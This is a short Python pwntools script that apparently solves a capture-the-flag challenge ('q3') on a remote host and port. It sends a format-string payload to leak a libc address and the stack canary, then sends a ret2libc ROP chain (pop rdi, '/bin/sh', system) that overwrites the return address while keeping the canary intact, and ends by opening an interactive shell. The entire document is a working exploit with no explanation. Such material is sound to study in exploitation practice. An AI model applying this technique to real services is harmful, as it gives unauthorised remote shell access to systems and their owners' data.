#!/usr/bin/env python
from pwn import *

e = ELF('q3')
libc = ELF('libc.so.6', checksec=False)

io = remote('68.183.158.95', 8991)

io.sendline('%2$lx-%11$lx')
io.recvline()
leak = io.recvline()
libc.address = int(leak.strip().split('-')[0], 16) - 0x3c6780
canary = int(leak.strip().split('-')[1], 16)

log.info("Libc: %s" % hex(libc.address))
log.info("Canary: %s" % hex(canary))

payload = flat(
        "A"*24,
        canary, 
        "A"*8,
        libc.address + 0x0000000000021102, # pop rdi; ret
        next(libc.search('/bin/sh')),
        libc.sym['system'],
        endianness = 'little', word_size = 64, sign = False)

io.recv()
io.sendline(payload)
io.interactive()
